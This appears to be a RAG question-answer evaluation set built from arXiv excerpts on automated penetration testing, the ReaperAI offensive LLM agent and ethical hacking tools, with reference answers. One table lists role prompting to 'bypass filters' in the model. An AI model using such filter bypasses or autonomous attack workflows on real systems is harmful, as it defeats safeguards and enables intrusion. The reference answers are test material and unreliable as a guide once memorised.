discovered nodes.\nThe second type of action is vulnerability exploitation, which can be classified into local vulnerability exploitation and\nremote vulnerability exploitation. Local vulnerability exploitation can only be performed on a connected node (the\nnode where the agent is operating), and the agent seeks to steal local information, increase host privileges, or discover\ncredentials for connecting to other nodes. Remote vulnerabilities come from nodes that are currently discovered but\nare not owned by the agent. By exploiting remote vulnerabilities, the agent can gather more information about the\nremote nodes.\nThe third type of action is connection, which enables the agent to connect a node using specific credentials and ports.\nDue to the agent’s lack of direct access to action outcomes, scanning is considered a mandatory action that must be\nperformed after each action rather than being optional in action space. Additionally, the scanning operation can also\ncontribute to forming an observation.\nThe action space is listed in Table 2, which includes three subspaces for local vulnerability exploitation, remote\nvulnerability exploitation, and connection, respectively. i, j, l, r, p, and c denote the ID of the source node, the target\nnode, the local vulnerability, the remote vulnerability, the port, and the credentials, respectively. ˆ\nn, ˆ\nnl, ˆ\nnr, ˆ\nnp, and\nˆ\nnc are agent’s estimations of the maximum number of nodes, local vulnerabilities, remote vulnerabilities, ports, and\ncredentials, respectively', '. Table 2 implies that for local vulnerability exploitation, the agent should choose the node ID\nand local vulnerability ID. For remote vulnerability exploitation, the agent should choose the source node ID, target\nTable 2: Action space of PT\nAction\nNotation\nSubspace Size\nLocal vulnerability exploit\n[i, l]\nˆ\nn × ˆ\nnl\nRemote vulnerability exploit\n[i, j, r]\nˆ\nn × (ˆ\nn −1) × ˆ\nnr\nConnection\n[i, j, p, c]\nˆ\nn × (ˆ\nn −1) × ˆ\nnp × ˆ\nnc\nnode ID, and remote vulnerability ID. The source node ID, target node ID, port ID, and credential ID should be set for\nthe connection. The PT action is a vector selected from one of the subspaces.\nWe consider each action will last a constant unit period, after which it will be considered completed and terminated.\n3.2\nObservation Space\nThe observation of the agent in PT is obtained by scanning operation after each action taken using scanning tools, such\nas Nmap [23]. The observation space is designed and shown in Table 3, which consists of many subspaces, including\nthe discovered nodes count, nodes privilege level, discovered nodes properties, leaked credentials, and lateral move.\nTable 3: Observation space of PT\nObservation\nNotation\nSubspace Size\nDiscovered nodes count\nnd\nˆ\nn\nNodes privilege level\n[ai]ˆ\nn\n2ˆ\nn\nDiscovered nodes properties\n[ai,p]ˆ\nn×ˆ\nnpr\n3ˆ\nn×ˆ\nnpr\nLeaked credentials\n[ai,p,c]ˆ\nn×ˆ\nnp×ˆ\nnc\n3ˆ\nn×ˆ\nnp×ˆ\nnc\nLateral move\nbl\n2\nAmong them, nodes privilege level is a vector describing the privilege level of every node, where two values can be\nassigned to each entry: 0 = “not owned”, 1 = “Admin”.\nDiscovered nodes properties tells what properties each node has. Properties include different types of operating\nsystems (e.g., Windows, Linux), different types of databases (e.g., SQLServer, MySQL), etc. It is represented by\na ˆ\nn × ˆ\nnpr matrix, where ˆ\nnpr is the estimated maximum number of properties. Each entry has three values: 0 = “No”,\n1 = “Yes”, 2 = “Unknown”.\nLeaked credentials is a ˆ\nn × ˆ\nnp × ˆ\nnc tensor with the first dimension indicating the target node ID, the second dimen-\nsion indicating the port ID, the third dimension indicating the credential ID. Each entry has three values: 0 = “Not\ndiscovered”, 1 = “Used”, 2 = “Unused”.\nLateral move indicates whether the agent successfully moves from one node to another in a new interaction with two\nvalues: 0 = “No”, 1 = “Yes”.\nBy flattening and concatenating all vectors from these five subspaces, we can get an observation vector.\n3.3\nReward Machine I (R1)\nIn this work, the PT agent is guided by the domain knowledge of PT encoded in an RM. In the field of PT, one useful\nguideline is that the pen-tester attempts to discover as many login credentials as possible to gain access and control\nover as many nodes as possible. Therefore, the PT can be divided into three subtasks: 1) discover new credentials, 2)\ngain access (connect) to a new node by using the discovered credentials, and 3) elevate the privilege of the connected\nnode to own its properties. This process will be repeated to own more and more nodes until the PT goal is met, such\nas discovering critical data or owning a specific number of nodes.\nAccording to this guideline, our first designed RM (R1) is shown in Figure 2, which has four states (U1 =\n{u0, u1, u2, u3}) starting from u0 and terminates at u3. Its event set P1 = {‘b’, ‘c’, ‘d’, ‘f’, ‘g’, ‘h’} is a subset\nof the set defined in Table 1.\nR1 tells that the agent will stay on u0 until new credentials are found (']","The agent's actions and observations interact with the RM's state-transitions and rewards to enable lateral movement in enterprise networks as follows: The agent performs actions such as scanning, local vulnerability exploitation, remote vulnerability exploitation, and connection. After each action, the agent performs a scanning operation to form an observation. The RM uses the labeling function L to assign truth values to events based on the input experience (ot, at, ot+1). The state-transition function δu then determines the next RM state based on the current state and the captured events. The reward-transition function δr outputs a reward function based on the current state and the captured events, which the agent uses to obtain the reward. This process guides the agent to discover new credentials, gain access to new nodes, and elevate privileges, thereby enabling lateral movement in the network.",multi_context,"[{'Published': '2024-05-24', 'Title': 'Knowledge-Informed Auto-Penetration Testing Based on Reinforcement Learning with Reward Machine', 'Authors': 'Yuanliang Li, Hanzheng Dai, Jun Yan', 'Summary': 'Automated penetration testing (AutoPT) based on reinforcement learning (RL)\nhas proven its ability to improve the efficiency of vulnerability\nidentification in information systems. However, RL-based PT encounters several\nchallenges, including poor sampling efficiency, intricate reward specification,\nand limited interpretability. To address these issues, we propose a\nknowledge-informed AutoPT framework called DRLRM-PT, which leverages reward\nmachines (RMs) to encode domain knowledge as guidelines for training a PT\npolicy. In our study, we specifically focus on lateral movement as a PT case\nstudy and formulate it as a partially observable Markov decision process\n(POMDP) guided by RMs. We design two RMs based on the MITRE ATT\\&CK knowledge\nbase for lateral movement. To solve the POMDP and optimize the PT policy, we\nemploy the deep Q-learning algorithm with RM (DQRM). The experimental results\ndemonstrate that the DQRM agent exhibits higher training efficiency in PT\ncompared to agents without knowledge embedding. Moreover, RMs encoding more\ndetailed domain knowledge demonstrated better PT performance compared to RMs\nwith simpler knowledge.', 'entry_id': 'http://arxiv.org/abs/2405.15908v1', 'published_first_time': '2024-05-24', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.AI', 'categories': ['cs.AI', 'cs.CR', 'cs.LG'], 'links': ['http://arxiv.org/abs/2405.15908v1', 'http://arxiv.org/pdf/2405.15908v1']}, {'Published': '2024-05-24', 'Title': 'Knowledge-Informed Auto-Penetration Testing Based on Reinforcement Learning with Reward Machine', 'Authors': 'Yuanliang Li, Hanzheng Dai, Jun Yan', 'Summary': 'Automated penetration testing (AutoPT) based on reinforcement learning (RL)\nhas proven its ability to improve the efficiency of vulnerability\nidentification in information systems. However, RL-based PT encounters several\nchallenges, including poor sampling efficiency, intricate reward specification,\nand limited interpretability. To address these issues, we propose a\nknowledge-informed AutoPT framework called DRLRM-PT, which leverages reward\nmachines (RMs) to encode domain knowledge as guidelines for training a PT\npolicy. In our study, we specifically focus on lateral movement as a PT case\nstudy and formulate it as a partially observable Markov decision process\n(POMDP) guided by RMs. We design two RMs based on the MITRE ATT\\&CK knowledge\nbase for lateral movement. To solve the POMDP and optimize the PT policy, we\nemploy the deep Q-learning algorithm with RM (DQRM). The experimental results\ndemonstrate that the DQRM agent exhibits higher training efficiency in PT\ncompared to agents without knowledge embedding. Moreover, RMs encoding more\ndetailed domain knowledge demonstrated better PT performance compared to RMs\nwith simpler knowledge.', 'entry_id': 'http://arxiv.org/abs/2405.15908v1', 'published_first_time': '2024-05-24', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.AI', 'categories': ['cs.AI', 'cs.CR', 'cs.LG'], 'links': ['http://arxiv.org/abs/2405.15908v1', 'http://arxiv.org/pdf/2405.15908v1']}]",True
How do Python wrappers and task trees boost AI's decision-making in cybersecurity?,"['. As\nof April 22, 2024, the rate per one million tokens worth of input is $10 and $30 per\none million output. This study in total cost about $40 dollars in research, devel-\nopment, and testing. This approach ensures that the study focuses on leveraging,\nat the time, cutting-edge AI capabilities to assess their practical applications and\neffectiveness in complex computational tasks.\n14\n3.2.2\nAutonomous Agents\nThis project aimed to develop a fully autonomous agent that could operate\nindependently without human intervention. This objective brings forth its own\nset of challenges and complexities, particularly in ensuring robust and reliable\noperations while balancing cutting edge technology. The Python wrapper used\nin this configuration serves as the central nervous system, orchestrating inter-\nactions and maintaining seamless communication between agent loops, LLMs,\nterminals, and python code. These LLM agents are tasked with autonomous rea-\nsoning and decision-making that simulate a high level of cognitive processing\nakin to human-like thinking and problem-solving skills to ensure that the agent\ncan act as if is a human operator.\n3.2.3\nObjectives and Tasks\nUnlike the approach taken in hackingbuddyGPT, which follows the BabyAGI\nNakajima [2024] model of executing an action within a task, enriching it with con-\ntext, and then reassessing priorities, this project introduces a structured task tree\nmethodology. While penetration testing typically follows a systematic approach\nsimilar to a task tree, it is crucial to incorporate the dynamic element of BabyAGI,\nwhere new and critical information can prompt immediate reprioritization and\nstrategic shifts. This dual approach ensures that the agents not only adhere to a\nstructured methodology but also remains flexible and responsive to new insights\nand challenges.\n3.2.4\nDecision-Making in Tasks\nThe autonomous decision-making process in these agents was crafted around\nthe completion of specific tasks. It was crucial to design a system that was not\nlimited to pre-defined, hard-coded strategies, but instead could adapt based on\nsituational demands. To achieve this flexibility, the developed evaluation method\nincorporates concepts of diminishing returns and strict time constraints—both re-\nflective of the nature required in penetration testing. This system evaluates task\ncompletion through dynamically generated prompts, which assess whether the\ntasks have been accomplished based on historical data and prior analyses.\n3.2.5\nAnalyzation\nBuilding upon the initial concepts of analyzation introduced by hackingbud-\ndyGPT, the methodology was enhanced to provide a more sophisticated analysis\nof actions and outcomes. This upgraded approach not only assesses what has\n15\ntranspired, but also generates recommendations for subsequent steps. Such on-\ngoing analyzation is crucial for the continuous improvement and adaptation of\nthe agents, ensuring they remain effective and relevant as they interact with com-\nplex environments.\n3.2.6\nEvaluation\nThis phase of the project introduces a new task evaluation concept that was\nnot covered by hackingbuddyGPT, inspired by traditional human-led decision-\nmaking processes. In this program, an agent performs an action, then evaluates\nthe results to determine if they suffice for the task at hand—or if only progress to-\nwards the task has been made. This evaluative process is critical and mirrors the\nfeedback mechanism in reinforcement learning models, where the agent learns\nand adapts based on success feedback.\n16\nCHAPTER 4\nBUILDING THE AI OFFENSIVE AGENT\nThe design of the AI offensive agent is rooted in the principle of leveraging\nthe LLM technology described previously as well as the methodology described\npreviously to simulate and understand offensive cybersecurity tasks. The heart\nof this system is the LLM, accessible through Python classes and APIs, while a\nPython wrapper serves as the core logic driver to process functions and essen-\ntially be the body of the LLM. This architecture allows for innovated integration\nof advanced AI capabilities with current cybersecurity tools and frameworks,\nproviding a unique concept for simulating cyber-attacks, analyzing potential vul-\nnerabilities, and automating the decision-making process. The Python wrapper\nfacilitates easy access to the LLM’s functionalities, enabling the dynamic con-\nstruction of queries and the interpretation of responses for further processing.\nThe core for this development was based on the foundation of hackingbuddyGPT\nwhich was enhanced to become ReaperAI, a proof of concept fully autonomous\noffensive agent. Happe and Cito [2023]\n4.1\nAgents\nThe design approach for this agent involves using a subset of specialized\nsub-agents, each tasked with executing more narrowly defined functions to en-\nhance result', ' and tasks\n– e.g., ”Identify SQL injections” when it’s unknown if a web server is\npresent\nDuring the development of the model, significant challenges were encoun-\ntered, particularly in the initial stages of transitioning from concept to imple-\nmentation. Prior to conducting thorough research and following a preliminary\nliterature review, there was an attempt to simply expand the capabilities of an ex-\nisting program, dubbed hackingbuddyGPT, from focusing solely on privilege esca-\nlation to encompassing comprehensive penetration testing tasks. This expansion\nproved problematic, as the program frequently struggled with the assigned tasks,\nveering into irrelevant tangents and rabbit holes. This lack of focus and direction\nnot only hindered progress but also highlighted the need for a more structured\nand research-driven approach.\nConsequently, these initial setbacks served as a catalyst for more extensive\nresearch. The difficulties faced underscored the complexities of adapting AI mod-\nels to the nuanced and dynamic field of cybersecurity, particularly in the realm of\npenetration testing. This led to a deeper exploration of the underlying principles\nand methodologies that could better support such a transition. The subsequent\nresearch aimed to refine the model’s approach, enhance its task-specific perfor-\nmance, and ensure that its outputs were relevant and practical for real-world\ncybersecurity challenges. This phase of development was crucial in establishing\nwhat is needed to move towards a more robust and effective AI-driven cyberse-\ncurity solution.\n33\nCHAPTER 6\nIMPLEMENTATION CHALLENGES, ETHICAL\nCONSIDERATIONS, FUTURE DIRECTION\nExploring the implementation challenges, ethical considerations, and future\ndirections of deploying AI offensive agents in cybersecurity offers a nuanced un-\nderstanding of the potential impacts and responsibilities associated with this in-\nnovative approach. These crucial aspects mentioned above are detailed below.\n6.1\nChallenges in Implementing AI Offensive Agents\nThe implementation of AI offensive agents in cybersecurity faces several\ntechnical and operational challenges. One primary concern is the accuracy and\nreliability of the agents’ actions, especially in complex and dynamic digital envi-\nronments. Unfruitful runs, can lead to unnecessary disruptions and resource allo-\ncation issues. Additionally, the scalability of AI systems to handle large-scale net-\nworks and rapidly evolving threats without compromising performance remains\na technical hurdle as well as relying on a closed source LLMs like GPT. There’s\nalso the challenge of integrating these advanced AI capabilities with existing cy-\nbersecurity infrastructure, requiring significant customization and adaptation to\nensure compatibility and effectiveness, as well as adaptiveness for unique tools\nand unique vulnerabilities. The challenges that an AI offensive agent will face to\nactually see a significant impact on the domain of penetration testing is great, but\nfor now they are just challenges.\n6.2\nEthical Considerations in Offensive Cybersecurity\nThe use of AI for offensive purposes in cybersecurity introduces a range of\nethical considerations that must be meticulously addressed. Key among these is\nthe potential for misuse, where powerful AI capabilities could be leveraged by\nmalicious actors if not properly secured. The development and deployment of\nAI offensive agents must be guided by strict ethical standards to prevent unin-\ntended consequences, such as privacy violations or collateral damage to unin-\ntended targets. Moreover, the transparency of AI decisions and actions is crucial\n34\nto maintain trust and accountability, especially when those decisions may have\nsignificant repercussions. In addition to keeping the data secured for each run,\nthe operator would have to have their own collection of capable models to ensure\nconfidentiality, integrity and availability of the data.\n6.3\nFuture Directions in AI-Driven Offensive Security\nLooking ahead, the domain of AI-driven offensive security is set to undergo\nsignificant advancements, driven by continual improvements in AI technologies\nand methodologies. This study represents an important step towards shaping the\nfuture of this field by highlighting specific areas that require substantial develop-\nment to yield impactful results:\n1. Enhanced Command-Line Interaction: One of the primary areas for devel-\nopment is improving the way programming languages, such as Python,\ninteract with command-line interfaces to execute interactive commands.\nWhile the use of tools like Pexpect is a promising development, further re-\nsearch is needed to enable large language models to effectively run oper-\nating systems and utilize various tools. Additionally, the creation of tool-\nspecific models could enhance the functionality and task fulfillment capa-\nbilities of these systems.\n2. Expansion of Greater Context Windows: To tackle the broad and complex\nproblems inherent in penetration testing, LLMs require larger context win-\ndows. This expansion would allow the models to retain and process more\nextensive data from previous']","Python wrappers and task trees enhance AI's decision-making in cybersecurity by serving as the central nervous system that orchestrates interactions and maintains seamless communication between agent loops, LLMs, terminals, and Python code. The task tree methodology introduces a structured approach to task execution while incorporating dynamic elements that allow for immediate reprioritization and strategic shifts based on new and critical information. This dual approach ensures that the agents adhere to a structured methodology while remaining flexible and responsive to new insights and challenges.",multi_context,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}, {'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How do ReaperAI's adaptive decision-making and NLP boost its pen testing?,"[' quality while ensuring communication upstream to the parent agent.\nMerely giving the LLM the task to ”complete a pentest” is too vast and too vague.\nThe only predefined hard coded workflow was the pentesting methodology to\nprevent the AI from deviating and ensure it remains focused on its intended pur-\npose, rather than determining its own fundamental objectives of a penetration\ntest. Previous experimentation showed that the LLMs knowledge set did contain\n”steps to complete a black box penetration test” but did not produce consistent and\naccurate fundamental objectives to be allowed to generate them autonomously.\nThe high-level agent tree can be seen in 4.1\n17\nFigure 4.1: Agent Hierarchy\n18\n4.2\nPrompting, Decision Making, and Natural Language Understanding\n4.2.1\nTemplating\nIn Happe’s project, implementation of the Mako templating library, was a\ngood foundation but was ultimately needed to be expanded to achieve the level\nof quality required for this study Bayer [2006]. Each prompt functions as a sub-\nagent within a ”prompt chaining” approach DAIR.AI [2024]. The prompts them-\nselves are stored in .txt files, which contain templating text. This setup allows the\ntext files to act as variables where various inputs can be introduced. For instance,\nstate history, commands, and other contextual data can be inserted to enhance\nthe quality of the interactions. This approach integrates several prompting tech-\nniques, including few-shot learning and chains of prompting, among others, to\nensure effective and efficient performance.\n4.2.2\nEnhanced Decision-Making Through Natural Language Prompting\nAt the heart of the agent’s functionality is its sophisticated use of natural\nlanguage prompting to guide decision-making and reasoning processes. This\nmethod involves framing cybersecurity tasks within natural language prompts\nthat the Large Language Model processes. By utilizing the LLM’s advanced lan-\nguage comprehension abilities, the system can generate insights, strategies, and\nresponses that closely resemble the thought processes of experienced human se-\ncurity experts. This strategic use of language-based prompts enhances the agent’s\nability to reason and decide on the most effective course of action in complex\nsecurity situations. Through this, ReaperAI has a combined way of prompting\ntechniques that at the time of research are fairly new. This integrates concepts\nlike Role Prompting, Chain-of-Prompting, Chain-of-Thought, Real-Time prompt\noptimization. These are all fairly new techniques that were described earlier and\nall combined to create the prompts in ReaperAI as seen in Table 4.1\n4.2.3\nAdaptive Decision-Making\nAdaptive decision-making is a core feature of ReaperAI, allowing it to dy-\nnamically adjust its strategies based on the analysis of command outputs and the\ncurrent state of the system. This flexibility is crucial for navigating the complex\nlandscape of penetration testing, where conditions can change unpredictably.\nBy evaluating the effectiveness of each command and its impact on the system,\nReaperAI can decide whether to alter command sequences, repeat commands,\nor adjust arguments according to the recommendations provided by the other\nLLM agents who analyze output. This adaptive approach ensures that the test-\ning strategy remains aligned with the evolving security environment, maximiz-\ning the effectiveness of the test and ensuring that all security vulnerabilities are\n19\nTechnique\nIntent\nRole Prompting\nBypass filters that would be used in the generic\nrole\nChain-of-\nPrompting\nChain prompts together to allow a bigger task to\nbe fullfilled\nChain-of-Thought\nChain the thoughts together on a pentest to\nmake a decision\nReal-Time\nprompt\noptimization\nProvide real-time information to the LLM\nTable 4.1: Table of Intent for Prompting Techniques\nthoroughly explored and addressed. The ability to integrate new insights helps\nmaintain the relevance and efficacy of the penetration testing process, ensuring\nthat each action taken is informed by the most current data and expert system\nanalysis via the prompt injection.\n4.2.4\nMinimizing Unwanted Behaviors Through Precise Prompt Engineer-\ning\nTo prevent unwanted behaviors such as irrelevant command outputs or overly\ndetailed explanations, the system employs the Mako templating engine described\nabove. This engine integrates data from the ReaperAI’s Python logic into the\nprompts, which are then passed to a prompt creation function. This approach\nminimizes the need for extensive prompt engineering by streamlining the inter-\naction with the LLM, focusing mainly on crafting basic, targeted inquiries that\nenhance the quality of the generated responses. By manipulating prompts', '\nFigure4.6, the LLM is equipped to reflect on its recent actions and respond appro-\npriately. This level of analysis is also beneficial for the human observer, enabling\nthem to monitor the LLM’s performance and ensure that it is operating correctly.\nThis dual focus on analysis helps maintain the integrity and effectiveness of the\nprocess.\nThis method, seen in Figure 4.7, is essential for conducting comprehensive\nand effective penetration tests, as it allows the AI to adapt its recommendations\nbased on real-time data and the evolving state of the system being tested. This\nongoing contextual awareness, seen in Figure 4.8, ensures that AI’s contributions\nare not only technically appropriate but also strategically astute, thereby enhanc-\ning the overall effectiveness of the penetration testing process by also giving a\nperspective view on what was just conducted on the terminal.\n25\nFigure 4.6: A Sample of State at a Given Time\nFigure 4.7: State Workflow\nFigure 4.8: Sample Analyzation at a Given Time\n4.6\nCommand Execution\n4.6.1\nNon-Interactive Execution\nArguably, one of the most complex aspects of this project involved devising\na unique method for the large language model to interact with a program. This\npaper previously outlined the significant challenge of lacking a standardized ap-\nproach for establishing bidirectional communication between a Python program\nand the LLM. In the ReaperAI system, JSON and structured prompts serve as the\nmain channels for this interaction, ensuring that outputs from the LLM are con-\nsistent, and well-formatted to allow parsing from within Python. Although the\nLLM can process a broad spectrum of information, the primary difficulty resides\n26\nin parsing, extracting, and applying the right information from the LLM and us-\ning that in a way that is effective.\nThis execution strategy draws inspiration from the concepts presented by\nHappe and hackingbuddyGPT Happe and Cito [2023] in 2023, yet deviates from\ntheir model by not using SSH to execute commands remotely. Instead, commands\nare run locally on a Kali machine using Python’s subprocess piping mechanism.\nDepending on the objectives and current tasks, ReaperAI formats this informa-\ntion into a prompt to solicit a command from the LLM. The command received\nfrom the LLM, structured as a JSON output, is then converted into an actual com-\nmand string that the subprocess can execute. This method ensures a seamless\ntranslation of LLM outputs into executable actions, optimizing the interaction\nbetween the LLM and the Python environment.\n4.6.2\nInteractive Execution\nInteractive execution is also a crucial feature of the script, facilitated by a tool\ncalled ’pexpect’ Spurrier [2013]. This tool allows the agent to interact dynamically\nwith the command-line interface, handling commands generated by the LLM.\nThe reason for the attention to this is that traditional one time run programs sig-\nnal an end to the terminal with an EOF, so the operator knows when to read the\nstdout. When commands prompt for user input, the EOF has not been reached\nyet, so we have to resort to another library for this concept. ”Pexpect is a pure\nPython module for spawning child applications; controlling them; and responding to ex-\npected patterns in their output. Pexpect works like Don Libes’ Expect. Pexpect allows\nyour script to spawn a child application and control it as if a human were typing com-\nmands” Spurrier [2013]. This simulates a human-like interaction with the system.\nThis process is managed by a separate command agent, which determines the\nappropriate times to send new inputs or read outputs from the command line,\nenhancing the program’s ability to handle complex sequences of commands that\nrequire interactive responses. This functionality is still not fully supported in\nReaperAI, but can be seen in Figure 4.9. The proof of concept demoed in ReaperAI,\nis based around metasploit, but the workflow was designed to be universal to-\nwards other interactive programs like smbclient, netcat, etc.\nReading of Interactive Output\nTo mimic human interaction patterns, ReaperAI\nutilizes a non-blocking read operation in a separate thread, allowing it to con-\ntinuously monitor the output as it becomes available for interactive programs.\nThis method involves periodically reading every line of output within a speci-\nfied time frame, much like a human will wait for, and read command outputs\nintermittently. The collected data is then updated and fed back to the LLM for\nfurther analysis, ensuring that the AI has the most current information to base its\nnext set']","ReaperAI's adaptive decision-making and natural language prompting enhance its penetration testing by dynamically adjusting strategies based on command outputs and the system's current state. This flexibility allows ReaperAI to navigate complex and changing conditions effectively. The use of natural language prompts leverages the LLM's advanced language comprehension to generate insights, strategies, and responses similar to those of experienced human security experts. This combination ensures that the testing strategy remains aligned with the evolving security environment, maximizing the effectiveness of the test and ensuring that all security vulnerabilities are thoroughly explored and addressed.",multi_context,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}, {'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How does the gap between industry and academia affect the development and utilization of Ethical Hacking tools?,"['Bridging the Gap: A Survey and Classification of\nResearch-informed Ethical Hacking Tools\nPaolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini\nTeesside University, Middlesbrough, United Kingdom\nAbstract\nThe majority of Ethical Hacking (EH) tools utilised in penetration testing are developed by practitioners\nwithin the industry or underground communities. Similarly, academic researchers have also contributed to\ndeveloping security tools. However, there appears to be limited awareness among practitioners of academic\ncontributions in this domain, creating a significant gap between industry and academia’s contributions to\nEH tools. This research paper aims to survey the current state of EH academic research, primarily focusing\non research-informed security tools. We categorise these tools into process-based frameworks (such as PTES\nand Mitre ATT&CK) and knowledge-based frameworks (such as CyBOK and ACM CCS). This classification\nprovides a comprehensive overview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code availability, development activity,\nand peer review status, providing valuable insights into the current state of research in this field.\nKeywords:\nEthical Hacking; Tools and Techniques; Research-informed, Classification; PTES; Mitre\nATT&CK; CyBOK; ACM CCS\n1. Introduction\nIn the domain of Ethical Hacking (EH), developing innovative tools is essential to tackle emerging threats\nand vulnerabilities. Ethical Hacking tools are designed mainly by 